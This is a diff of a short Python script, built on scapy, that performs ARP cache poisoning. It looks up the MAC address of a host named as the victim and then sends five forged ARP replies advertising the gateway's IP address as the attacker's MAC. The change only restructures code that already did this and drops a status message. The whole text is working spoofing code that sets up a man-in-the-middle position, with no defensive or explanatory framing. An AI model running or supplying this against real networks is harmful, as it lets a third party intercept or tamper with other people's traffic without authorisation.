@@ -1,35 +1,23 @@
 from scapy.all import ARP, Ether, get_if_hwaddr, sendp, srp1
 
+iface = "eth0"
+victim_ip = "10.0.1.11"
+gateway_ip = "10.0.1.254"
+attacker_mac = get_if_hwaddr(iface)
 
-def main():
-    iface = "eth0"
-    attacker_ip = "10.0.1.10"
-    victim_ip = "10.0.1.11"
-    gateway_ip = "10.0.1.254"
-    attacker_mac = get_if_hwaddr(iface)
+reply = srp1(
+    Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=victim_ip),
+    iface=iface,
+    timeout=2,
+    verbose=False,
+)
+if reply is None or ARP not in reply:
+    raise SystemExit(f"No ARP reply from {victim_ip}")
 
-    discovery = Ether(src=attacker_mac, dst="ff:ff:ff:ff:ff:ff") / ARP(
-        op=1,
-        hwsrc=attacker_mac,
-        psrc=attacker_ip,
-        pdst=victim_ip,
-    )
-    reply = srp1(discovery, iface=iface, timeout=2, verbose=False)
-    if reply is None or ARP not in reply or reply[ARP].psrc != victim_ip:
-        raise SystemExit(f"No ARP reply from {victim_ip} on {iface}")
+victim_mac = reply[ARP].hwsrc
+packet = Ether(src=attacker_mac, dst=victim_mac) / ARP(
+    op=2, psrc=gateway_ip, hwsrc=attacker_mac,
+    pdst=victim_ip, hwdst=victim_mac,
+)
 
-    victim_mac = reply[ARP].hwsrc
-    spoofed_reply = Ether(src=attacker_mac, dst=victim_mac) / ARP(
-        op=2,
-        hwsrc=attacker_mac,
-        psrc=gateway_ip,
-        hwdst=victim_mac,
-        pdst=victim_ip,
-    )
-
-    print(f"Advertising {gateway_ip} as {attacker_mac} to {victim_ip} ({victim_mac})")
-    sendp(spoofed_reply, iface=iface, count=5, inter=1, verbose=False)
-
-
-if __name__ == "__main__":
-    main()
+sendp(packet, iface=iface, count=5, inter=1)
